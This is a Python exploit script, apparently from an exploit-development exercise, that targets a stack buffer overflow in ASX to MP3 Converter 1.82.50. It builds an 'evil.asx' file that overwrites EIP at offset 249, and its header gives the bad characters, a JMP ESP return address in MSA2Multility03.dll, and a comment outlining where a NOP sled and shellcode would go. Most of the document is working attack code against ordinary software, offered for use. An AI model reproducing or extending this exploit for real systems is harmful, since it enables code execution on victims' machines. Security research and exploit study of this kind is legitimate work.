#!/usr/bin/python
#	ASX to MP3 Converter 1.82.50 SOF exploit
#       Use this tool to prove you have control over EIP
#       First use asxmp3_EIPoffset.py to determine EIP offset
#       If offset is correct, EIP with be "4242442" (BBBB)
#       Software: https://www.exploit-db.com/apps/b7c8c2a232e1d4a959c43970a877a799-ASXtoMP3Converter.exe
#       Date: 02 Oct 2022
#       Reference:
#       Author: Dylan Jenkins
#	Based on PoC by the totally real person: Ivan Ivanovic Ivanov
#	Reference: https://www.exploit-db.com/exploits/38382/
#	Tested on: Windows 2k3
#       EIP Offset: 249
#       Bad Chars: x00\x09\x0a\x1a
#       Return Address | dll: 0x1003789d ("\xFF\xEF", JMP ESP) | MSA2Multility03.dll
#       Usage: Open ASX to MP3 Converter application > load evil asx file

import socket
import time
import sys

filler = "A" * 249
eip = "B" * 4
offset = "C" * 4

#   Buffer Sturcture:
#   AAAAA.AAAA + EIP + NOP...NOP + shellcode + BBB....BBB

inputBuffer = filler + eip + offset

#   Create buffer asx file and print to user

print("\n .asx file buffer file creator, run as sudo/admin for file creation rights \n")
print("\nCreating evil asx file buffer to test control of EIP\n") 

print("\ninput buffer is:\n")
print(inputBuffer)
print("\ncreatingfile: evil.asx\n")
f = open("evil.asx", "w")
f.write(inputBuffer)
f.close()
   
print("\nclosing\n")
sys.exit()
